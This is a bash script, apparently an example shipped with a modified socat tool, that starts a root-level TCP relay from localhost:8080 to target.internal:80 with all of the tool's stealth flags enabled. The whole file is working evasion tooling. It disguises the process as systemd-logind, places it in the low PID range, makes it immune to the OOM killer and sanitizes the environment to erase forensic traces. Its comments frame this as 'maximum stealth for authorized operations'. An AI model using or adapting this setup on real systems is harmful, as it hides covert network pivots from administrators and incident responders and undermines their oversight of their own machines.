#!/bin/bash
# Full stealth configuration example
# Combines all stealth features for maximum operational security

CONDUIT="${CONDUIT:-./socat-repo/conduit}"
TARGET_PID="${TARGET_PID:-500}"
PORT_RANGE="${PORT_RANGE:-49152-65535}"

if [ "$EUID" -ne 0 ]; then
    echo "ERROR: Full stealth configuration requires root privileges"
    echo "Usage: sudo TARGET_PID=500 PORT_RANGE=49152-65535 $0"
    exit 1
fi

echo "Full Stealth Configuration"
echo "=========================="
echo "Process name:    systemd-logind"
echo "Target PID:      $TARGET_PID"
echo "Port range:      $PORT_RANGE"
echo "OOM immunity:    ENABLED"
echo "Env sanitize:    ENABLED"
echo ""
echo "Relay: localhost:8080 -> target.internal:80"
echo ""

"$CONDUIT" \
    -Ms \
    -Mp "$TARGET_PID" \
    -Mo \
    -MP "$PORT_RANGE" \
    -Me \
    TCP-LISTEN:8080,fork,reuseaddr \
    TCP:target.internal:80

# Usage:
# sudo TARGET_PID=500 PORT_RANGE=32768-60999 ./full-stealth.sh
#
# This combines ALL stealth features:
# - Process name masquerading (-Ms: systemd-logind)
# - PID targeting (-Mp: blend into low PID range)
# - OOM immunity (-Mo: survive memory pressure)
# - Port range control (-MP: standard ephemeral range)
# - Environment sanitization (-Me: remove forensic artifacts)
#
# Result: Maximum stealth for authorized operations
